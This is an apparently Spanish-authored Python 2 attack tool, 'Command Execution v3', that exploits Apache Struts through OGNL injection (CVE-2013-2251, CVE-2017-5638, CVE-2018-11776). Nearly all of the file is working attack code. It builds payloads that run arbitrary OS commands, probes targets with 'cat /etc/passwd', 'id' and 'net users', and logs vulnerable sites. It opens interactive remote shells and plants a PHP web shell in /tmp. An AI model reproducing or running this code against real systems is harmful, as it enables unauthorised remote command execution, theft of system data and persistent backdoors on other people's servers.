#!/usr/bin/python
import requests
import urllib2
import urllib
import time
import sys
import os
import commands
import readline
import urlparse
import ssl

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])
cls()

logo = BLUE+'''                                                             
  ___   _____  ___    _   _  _____  ___   
 (  _`\(_   _)|  _`\ ( ) ( )(_   _)(  _`\ 
 | (_(_) | |  | (_) )| | | |  | |  | (_(_)
 `\__ \  | |  | ,  / | | | |  | |  `\__ \ 
 ( )_) | | |  | |\ \ | (_) |  | |  ( )_) |
 `\____) (_)  (_) (_)(_____)  (_)  `\____) 

        =[ Command Execution v3]=
              By @s1kr10s                                                                                                            
'''+ENDC
print logo
		
print " * Ejemplo: http(s)://www.victima.com/files.login\n"
host = raw_input(BOLD+" [+] HOST: "+ENDC)
context = ssl._create_unverified_context()

if len(host) > 0:
	if host.find("https://") != -1 or host.find("http://") != -1:

		poc = "?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}"
		
		def exploit1(comando):
			exploit1 = "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+comando+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"
			return exploit1

		def exploit2(comando):
			exploit2 = "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(comando)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"
			return exploit2

		def exploit3(comando):
			exploit3 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27"+comando+"%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
			return exploit3

		def pwnd(shellfile):
			exploitfile = "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+shellfile+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"
			return exploitfile

		def validador():
			arr_lin_win = ["file%20/etc/passwd","dir","net%20users","id","/sbin/ifconfig","cat%20/etc/passwd"]
			return arr_lin_win

		# CVE-2013-2251 ---------------------------------------------------------------------------------

		try:
			response = urllib.urlopen(host+poc, context=context)
			response = response.read()
		except:
			print RED+" Servidor no responde\n"+ENDC
			exit(0)

		print BOLD+"\n [+] EJECUTANDO EXPLOIT CVE-2013-2251"+ENDC

		if response.find("('mamalo')") == -1:
			if response.find("mamalo") != -1:
				print RED+"   [-] VULNERABLE"+ENDC
				owned = open('vulnsite.txt', 'a')
				owned.write(str(host)+'\n')
				owned.close()

				opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
				if opcion == 's':
					print YELLOW+"   [-] GET PROMPT...\n"+ENDC
					time.sleep(1)
					print BOLD+"   * [UPLOAD SHELL]"+ENDC
					print OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC

					while 1:
						separador = raw_input(GREEN+"Struts2@Shell_1:$ "+ENDC)
						espacio = separador.split(' ')
						comando = "','".join(espacio)

						if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
							shell = urllib.urlopen(host+exploit1("'"+str(comando)+"'"), context=context)
							print "\n"+shell.read()
						elif espacio[0] == 'pwnd':
							pathsave=raw_input("path EJ:/tmp/: ")

							if espacio[1] == 'php':
								shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
								urllib2.urlopen(host+pwnd(str(shellfile)))
								shell = urllib.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"), context=context)
								if shell.read().find(pathsave+"status.php") != -1:
									print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
								else:
									print BOLD+RED+"\nNo Create File :/\n"+ENDC

		# CVE-2017-5638 ---------------------------------------------------------------------------------					
		print BLUE+"     [-] NO VULNERABLE"+ENDC			
		print BOLD+" [+] EJECUTANDO EXPLOIT CVE-2017-5638"+ENDC
		x = 0
		while x < len(validador()):
			valida = validador()[x]

			try:
				req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
				result = urllib2.urlopen(req).read()

			  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
			  		print RED+"   [-] VULNERABLE"+ENDC
			  		owned = open('vulnsite.txt', 'a')
					owned.write(str(host)+'\n')
					owned.close()

					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
					if opcion == 's':
						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
						time.sleep(1)

					  	while 1:
							try:
								separador = raw_input(GREEN+"\nStruts2@Shell_2:$ "+ENDC)
								req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separador))})
								result = urllib2.urlopen(req).read()
								print "\n"+result
							except:
								exit(0)
					else:
						x = len(validador())
				else:
					print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
			except:
				pass
			x=x+1

		# CVE-2018-11776 ---------------------------------------------------------------------------------
		print BLUE+"     [-] NO VULNERABLE"+ENDC			
		print BOLD+" [+] EJECUTANDO EXPLOIT CVE-2018-11776"+ENDC
		x = 0
		while x < len(validador()):
			#Filtramos la url solo dominio
			url = host.replace('#', '%23')
			url = host.replace(' ', '%20')
			if ('://' not in url):
				url = str("http://") + str(url)
			scheme = urlparse.urlparse(url).scheme
			site = scheme + '://' + urlparse.urlparse(url).netloc

			#Filtramos la url solo path
			file_path = urlparse.urlparse(url).path
			if (file_path == ''):
				file_path = '/'
			
			valida = validador()[x]

			try:
				result = requests.get(site+"/"+exploit3(str(valida))+file_path).text

				if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find("inet") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("accounts") != -1 or result.find("Cuentas") != -1:
			  		print RED+"   [-] VULNERABLE"+ENDC
			  		owned = open('vulnsite.txt', 'a')
					owned.write(str(host)+'\n')
					owned.close()

					opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
					if opcion == 's':
						print YELLOW+"   [-] GET PROMPT...\n"+ENDC
						time.sleep(1)

					  	while 1:
							separador = raw_input(GREEN+"Struts2@Shell_3:$ "+ENDC)
							espacio = separador.split(' ')
							comando = "%20".join(espacio)

							shell = requests.get(site+"/"+exploit3(str(comando))+file_path)
							print "\n"+shell.text
					else:
						x = len(validador())
						exit(0)
				else:
					print BLUE+"     [-] NO VULNERABLE "+ENDC + "Payload: " + str(x)
			except:
				pass
			x=x+1
	else:
		print RED+" Debe introducir el protocolo (https o http) para el dominio\n"+ENDC
		exit(0)
else:
	print RED+" Debe Ingresar una Url\n"+ENDC
	exit(0)

